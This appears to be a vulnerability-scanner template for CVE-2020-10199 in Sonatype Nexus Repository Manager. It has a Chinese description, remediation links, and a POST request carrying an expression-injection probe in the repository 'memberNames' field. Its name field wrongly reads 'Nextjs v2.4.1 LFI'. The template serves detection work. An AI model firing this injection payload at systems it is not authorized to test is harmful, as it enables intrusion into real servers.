id: CVE-2020-10199
info:
  name: Nextjs v2.4.1 LFI
  author:
  - l0ne1y
  description: |-
    Sonatype Nexus Repository Manager代码执行漏洞
    Sonatype Nexus Repository Manager（NXRM）是美国Sonatype公司的一款Maven仓库管理器。

    Sonatype Nexus Repository Manager 3.21.2之前版本中存在安全漏洞。攻击者可借助恶意的请求利用该漏洞执行任意代码。
  reference:
  - https://cert.360.cn/report/detail?id=b3eaa020cf5c0e9e92136041e4d713bb
  - https://securitylab.github.com/advisories/ghsl-2020-011-nxrm-sonatype
  - https://www.cnblogs.com/magic-zero/p/12641068.html
  - https://support.sonatype.com/hc/en-us/articles/360044882533-cve-2020-10199-nexus-repository-manager-3-remote-code-execution-2020-03-31
  severity: critical
  remediation: |-
    官方修复方案：
    1.目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://support.sonatype.com/hc/en-us/articles/360044882533-CVE-2020-10199-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31
requests:
- matchers:
  - type: word
    part: body
    words:
    - '{{randstr}} '
  - type: status
    status:
    - 400
  matchers-condition: and
  path:
  - '{{BaseURL}}/rest/beta/repositories/go/group'
  method: POST
  body: '{"name": "internal","online": true,"storage": {"blobStoreName": "default","strictContentTypeValidation":
    true},"group": {"memberNames": ["$\\c{ {{randstr}} }"]}}'
  headers:
    Content-Type: application/json
